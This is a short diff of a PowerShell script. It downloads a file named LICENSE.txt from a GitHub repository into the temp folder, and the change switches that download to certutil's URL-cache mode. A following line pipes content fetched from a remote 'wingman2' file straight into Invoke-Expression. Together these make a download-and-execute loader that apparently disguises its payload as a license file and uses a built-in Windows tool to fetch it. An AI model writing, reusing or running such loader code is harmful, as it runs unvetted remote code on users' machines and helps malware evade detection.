@@ -2,7 +2,7 @@ $URI="https://github.com/eforentropy/Wingman/raw/refs/heads/main/LICENSE.txt"
 $NAME = "LICENSE.txt"
 $tmpDir = [System.IO.Path]::GetTempPath()
 $exactPATH = Join-Path -Path $tmpDir -ChildPath $NAME
-Invoke-WebRequest -Uri $URI -OutFile $exactPATH
+certutil -urlcache -split -f $URI $exactPATH
 iex (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/eforentropy/Wingman/refs/heads/main/wingman2" -UseBasicParsing).Content
 
 
